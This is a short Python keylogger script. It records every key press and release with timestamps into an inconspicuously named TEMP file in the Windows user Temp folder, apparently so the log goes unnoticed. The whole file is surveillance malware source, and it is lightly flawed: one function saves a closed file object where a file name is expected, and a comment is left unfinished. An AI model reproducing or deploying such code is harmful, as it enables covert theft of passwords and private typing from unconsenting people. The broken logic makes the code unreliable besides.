from re import search
from random import randint
from pynput import keyboard
from datetime import datetime
from os import getcwd, chdir, path, listdir

# Notes are written as such:

find = str.find

storage_file = None

def CreateStorageFile():
    global storage_file

    to_write = f"TEMP_{randint(1, 10)}.txt"

    with open(to_write, "w") as written_file: # w is for write, here we write to a non-exisiting file therefore creating one
        written_file.write(f"\n")

        storage_file = written_file

    print(f"CREATED FILE AT: {getcwd()}")

def KeyPressed(keyPress):
    global storage_file

    current_time = datetime.now()

    with open(storage_file, "a") as writing_to:
        writing_to.write(f"Key Pressed: {keyPress} at {current_time}\n")

    print("Logged event...")

def KeyReleased(keyPress):
    global storage_file
    
    current_time = datetime.now()

    with open(storage_file, "a") as writing_to:
        writing_to.write(f"Key Released: {keyPress} at {current_time}\n")
    print("Logged event...")

def CreateListenerEvent():
    with keyboard.Listener(on_press=KeyPressed, on_release=KeyReleased) as keyboard_listener:
        keyboard_listener.join()

def BeginSetup():
    global storage_file

    has_logger_file = None
    current_dir = getcwd()
    to_go_to = path.expanduser(r"~\AppData\Local\Temp")

    if current_dir != to_go_to:
        chdir(to_go_to)
        current_dir = to_go_to

        for item in listdir(current_dir):
            if search("TEMP", str(item)):
                has_logger_file = True

                print("FOUND FILE TO LOG TO!")

                storage_file = item
                break
        
        if has_logger_file != True:
            CreateStorageFile()

        print("Setup success!")

def RunKeylogRecord():
    BeginSetup()

    if storage_file != None:
        print(f"Storage file located! {storage_file}")
        CreateListenerEvent()


if __name__ == "__main__":
    RunKeylogRecord()
